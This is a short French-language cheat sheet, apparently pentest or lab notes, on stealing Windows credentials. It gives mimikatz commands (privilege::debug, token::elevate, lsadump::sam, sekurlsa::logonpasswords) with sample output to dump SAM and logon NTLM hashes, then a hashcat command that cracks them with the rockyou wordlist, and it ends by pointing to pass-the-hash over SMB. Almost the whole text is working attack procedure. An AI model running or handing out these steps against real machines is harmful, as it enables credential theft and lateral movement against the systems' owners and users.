On doit lancer mimikatz.exe en administrateur.
## Preparation de la récupération :
#### Passe en debug
```
mimikatz # privilege::debug
Privilege '20' OK
```
#### On éleve le token :
```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

668     {0;000003e7} 1 D 41047          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0027532c} 2 F 3643650     MARKETINGWK02\nadine    S-1-5-21-1351291662-2228892526-3561702016-1002  (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 3740153     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```
## Recupération des hashs de mdp
```
mimikatz # lsadump::sam
```

## Récuperation des hash NTLM des connexion passé :
```
.\mimi.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
```
## Crack :
#### 1e - on cherche le code de hashcat pour le ntlm :
```
$ hashcat --help | grep -i "ntlm"                                                                            
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System

```
#### 2e - Attaque avec hashcat
```
$ hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

```

**Si le mot de passe n'est pas trouvé, sur le serveur smb, il y a la technique PASS THE HASH**
